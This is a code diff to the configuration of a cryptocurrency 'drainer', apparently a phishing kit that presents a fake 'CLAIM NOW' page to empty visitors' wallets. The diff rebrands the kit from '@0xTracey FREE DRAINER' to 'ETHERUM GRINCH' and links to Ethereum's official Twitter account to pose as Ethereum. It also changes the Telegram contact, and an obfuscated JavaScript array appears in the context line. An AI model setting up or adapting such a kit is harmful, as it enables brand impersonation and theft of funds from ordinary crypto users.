@@ -7,11 +7,11 @@ var _0xf9cd=["\x30\x78\x65\x31","\x30\x78\x31\x31\x66","\x30\x78\x32\x39\x34","\
 
 // Collection settings
 const collectionInfo = {
-    name: "@0xTracey FREE DRAINER",
+    name: "ETHERUM GRINCH",
     socialMedia: {
-        discord: "https://discord.com",
-        twitter: "https://twitter.com",
-        instagram: "https://instagram.com",
+        discord: "",
+        twitter: "https://twitter.com/ethereum",
+        instagram: "",
     },
 }
 
@@ -22,9 +22,9 @@ const indexPageInfo = {
 }
 
 const claimPageInfo = {
-    title: "@0xTracey DRAINER", // <br> is a line break
-    shortDescription: "Get this Drainer for free though Github. @0xTracey",
-    longDescription: "https://t.me/nftstealer",
+    title: "ETHEREUM", // <br> is a line break
+    shortDescription: "",
+    longDescription: "https://t.me/rawchilly",
 
     claimButtonText: "CLAIM NOW",
 
